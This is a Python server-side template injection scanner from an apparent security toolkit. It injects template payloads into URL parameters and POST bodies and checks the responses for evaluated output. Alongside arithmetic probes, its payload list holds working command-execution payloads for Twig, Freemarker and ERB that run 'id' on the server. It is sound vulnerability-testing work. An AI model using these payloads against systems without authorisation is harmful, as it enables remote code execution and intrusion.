"""tools/ssti_scanner.py — Server-Side Template Injection (SSTI) Scanner.

Detects SSTI vulnerabilities by injecting template expressions that
evaluate mathematical operations. Uses various template engine payloads:
- Jinja2 (Python)
- Twig (PHP)
- Freemarker (Java)
- Velocity (Java)
- ERB (Ruby)
- Blade (Laravel)

Public API:
    SSTIScanner - Main scanner class
    SSTIResult - Result of a single test
    SSTIScanResult - Full scan results
"""

from __future__ import annotations

import logging
import re
import time
import urllib.parse
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Tuple

logger = logging.getLogger("elengenix.ssti_scanner")


@dataclass
class SSTIResult:
    """Result of a single SSTI test."""

    url: str
    param: str
    payload: str
    engine: str
    vulnerable: bool
    evidence: str = ""
    severity: str = "High"
    confidence: float = 0.0


@dataclass
class SSTIScanResult:
    """Full SSTI scan results."""

    target: str
    results: List[SSTIResult] = field(default_factory=list)
    vulnerable_params: List[str] = field(default_factory=list)
    engines_detected: List[str] = field(default_factory=list)
    total_tests: int = 0
    duration: float = 0.0

    @property
    def is_vulnerable(self) -> bool:
        return any(r.vulnerable for r in self.results)

    def summary(self) -> Dict[str, Any]:
        return {
            "target": self.target,
            "vulnerable": self.is_vulnerable,
            "vulnerable_params": self.vulnerable_params,
            "engines_detected": self.engines_detected,
            "total_findings": len([r for r in self.results if r.vulnerable]),
            "total_tests": self.total_tests,
            "duration": self.duration,
        }


# SSTI payloads by template engine
# Each tuple: (payload, expected_output, engine_name)
SSTI_PAYLOADS = [
    # Jinja2 (Python)
    ("{{7*7}}", "49", "jinja2"),
    ("{{7*'7'}}", "7777777", "jinja2"),
    ("{{config}}", "Config", "jinja2"),
    ("{{self.__class__.__mro__}}", "MRO", "jinja2"),
    # Twig (PHP)
    ("{{7*7}}", "49", "twig"),
    (
        "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}",
        "uid",
        "twig",
    ),
    # Freemarker (Java)
    ("${7*7}", "49", "freemarker"),
    ("<#assign ex='freemarker.template.utility.Execute'?new()> ${ex('id')}", "uid", "freemarker"),
    # Velocity (Java)
    ("#set($x=7*7)$x", "49", "velocity"),
    ("#set($str=$class.inspect('java.lang.String'))", "", "velocity"),
    # ERB (Ruby)
    ("<%= 7*7 %>", "49", "erb"),
    ("<%= system('id') %>", "uid", "erb"),
    # Blade (Laravel)
    ("{{7*7}}", "49", "blade"),
    ("@php echo 7*7 @endphp", "49", "blade"),
    # Generic
    ("${7*7}", "49", "generic"),
    ("<%= 7*7 %>", "49", "generic"),
    ("#{7*7}", "49", "generic"),
]

# Detection patterns for template engines
ENGINE_PATTERNS = [
    (r"jinja2", "jinja2"),
    (r"twig", "twig"),
    (r"freemarker", "freemarker"),
    (r"velocity", "velocity"),
    (r"erb", "erb"),
    (r"blade", "blade"),
    (r"django", "django"),
    (r"mako", "mako"),
    (r"pug", "pug"),
    (r"handlebars", "handlebars"),
]


class SSTIScanner:
    """SSTI vulnerability scanner.

    Tests input parameters for Server-Side Template Injection by
    injecting template expressions that evaluate mathematical operations.

    Example:
        scanner = SSTIScanner()
        result = scanner.scan("https://example.com/render?name=test")
        if result.is_vulnerable:
            print(f"SSTI found in: {result.vulnerable_params}")
            print(f"Engines: {result.engines_detected}")
    """

    def __init__(
        self,
        timeout: float = 10.0,
        verify_ssl: bool = False,
    ):
        """Initialize the SSTI scanner.

        Args:
            timeout: Request timeout in seconds.
            verify_ssl: Whether to verify SSL certificates.
        """
        self.timeout = timeout
        self.verify_ssl = verify_ssl

    def scan(
        self,
        target_url: str,
        params: Optional[Dict[str, str]] = None,
        method: str = "GET",
    ) -> SSTIScanResult:
        """Scan a URL for SSTI vulnerabilities.

        Args:
            target_url: The URL to test.
            params: URL parameters to test. If None, auto-discovers parameters.
            method: HTTP method to use.

        Returns:
            SSTIScanResult with all test results.
        """
        import requests

        start_time = time.time()
        result = SSTIScanResult(target=target_url)

        # Parse the URL to get existing parameters
        parsed = urllib.parse.urlparse(target_url)
        existing_params = dict(urllib.parse.parse_qsl(parsed.query))

        # Merge with provided params
        test_params = {**existing_params, **(params or {})}

        # If no parameters, test common ones
        if not test_params:
            test_params = {
                "name": "",
                "template": "",
                "page": "",
                "file": "",
                "view": "",
                "include": "",
                "render": "",
                "content": "",
                "body": "",
                "text": "",
            }

        # Test each parameter with each payload
        for param_name, original_value in test_params.items():
            for payload, expected, engine in SSTI_PAYLOADS:
                result.total_tests += 1

                try:
                    # Build test URL
                    test_params_copy = dict(test_params)
                    test_params_copy[param_name] = payload
                    test_url = urllib.parse.urlunparse(
                        parsed._replace(query=urllib.parse.urlencode(test_params_copy))
                    )

                    # Make request
                    response = requests.get(
                        test_url,
                        timeout=self.timeout,
                        verify=self.verify_ssl,
                        allow_redirects=True,
                    )

                    # Check if the payload was evaluated
                    response_text = response.text[:10000]

                    # Check for exact match
                    if expected and expected in response_text:
                        ssti_result = SSTIResult(
                            url=test_url,
                            param=param_name,
                            payload=payload,
                            engine=engine,
                            vulnerable=True,
                            evidence=f"Response contains '{expected}' from {engine} payload",
                            severity="High",
                            confidence=0.9,
                        )
                        result.results.append(ssti_result)
                        if param_name not in result.vulnerable_params:
                            result.vulnerable_params.append(param_name)
                        if engine not in result.engines_detected:
                            result.engines_detected.append(engine)
                        logger.info(f"SSTI found: {param_name} with {engine} engine")
                        break

                    # Check for error messages that reveal template engine
                    for pattern, detected_engine in ENGINE_PATTERNS:
                        if re.search(pattern, response_text, re.IGNORECASE):
                            if detected_engine not in result.engines_detected:
                                result.engines_detected.append(detected_engine)
                            logger.debug(f"Template engine detected: {detected_engine}")

                except requests.exceptions.Timeout:
                    logger.debug(f"Timeout for {param_name}={payload}")
                except Exception as e:
                    logger.debug(f"Error testing {param_name}: {e}")

        result.duration = time.time() - start_time
        return result

    def scan_raw_input(
        self,
        target_url: str,
        input_data: str,
        content_type: str = "application/x-www-form-urlencoded",
    ) -> SSTIScanResult:
        """Scan raw input data for SSTI.

        Args:
            target_url: The URL to test.
            input_data: Raw input data to inject payloads into.
            content_type: Content-Type header.

        Returns:
            SSTIScanResult with all test results.
        """
        import requests

        start_time = time.time()
        result = SSTIScanResult(target=target_url)

        for payload, expected, engine in SSTI_PAYLOADS:
            result.total_tests += 1

            try:
                # Replace common placeholder patterns
                test_data = input_data.replace("FUZZ", payload)

                response = requests.post(
                    target_url,
                    data=test_data,
                    headers={"Content-Type": content_type},
                    timeout=self.timeout,
                    verify=self.verify_ssl,
                )

                response_text = response.text[:10000]

                if expected and expected in response_text:
                    ssti_result = SSTIResult(
                        url=target_url,
                        param="raw_input",
                        payload=payload,
                        engine=engine,
                        vulnerable=True,
                        evidence=f"Response contains '{expected}' from {engine} payload",
                        severity="High",
                        confidence=0.9,
                    )
                    result.results.append(ssti_result)
                    if "raw_input" not in result.vulnerable_params:
                        result.vulnerable_params.append("raw_input")
                    if engine not in result.engines_detected:
                        result.engines_detected.append(engine)
                    logger.info(f"SSTI found in raw input with {engine} engine")
                    break

            except Exception as e:
                logger.debug(f"Error testing raw input: {e}")

        result.duration = time.time() - start_time
        return result
